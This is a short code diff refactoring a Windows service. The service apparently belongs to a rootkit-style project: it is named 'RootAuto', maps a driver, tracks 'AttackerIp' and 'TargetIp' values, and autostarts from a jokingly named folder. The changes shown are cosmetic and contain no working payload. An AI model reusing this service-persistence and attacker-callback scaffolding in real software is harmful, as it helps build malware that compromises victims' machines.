@@ -12,8 +12,7 @@ VOID WINAPI ServiceControlHandler(DWORD);  // controls events, like IRP_MJ_DEVIC
 DWORD WINAPI ServiceMainThread(LPVOID lpParam);  // main thread, actually activates the medium service and maps the driver
 
 
-DWORD WINAPI ServiceMainThread(LPVOID lpParam)
-{
+DWORD WINAPI ServiceMainThread(LPVOID lpParam) {
     RETURN_LAST LastErrorSpecial = { 0, 0 };
     int LastError = 0;
     char TargetIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
@@ -31,11 +30,7 @@ DWORD WINAPI ServiceMainThread(LPVOID lpParam)
 
 
     // Make sure that all depended-on files exist on target machine (folders + files):
-    LastError = VerfifyDepDirs();
-    if (LastError != 0) {
-        return LastError;
-    }
-    LastError = VerfifyDepFiles(AttackerIp);
+    LastError = VerifyDependencies(AttackerIp);
     if (LastError != 0) {
         return LastError;
     }
@@ -147,11 +142,8 @@ VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv)
 }
 
 
-int main(int argc, TCHAR* argv[])
-{
-    char AutoName[11] = "RootAuto";
-    WCHAR WideAutoName[MAX_PATH];
-    CharpToWcharp(AutoName, WideAutoName);
+int main(int argc, TCHAR* argv[]) {
+    WCHAR WideAutoName[] = L"RootAuto";
     AutomaticService.InitiateService(WideAutoName);
     AutomaticService.ServiceFile = "C:\\nosusfolder\\verysus\\AutoService\\AutoStart.exe";
 
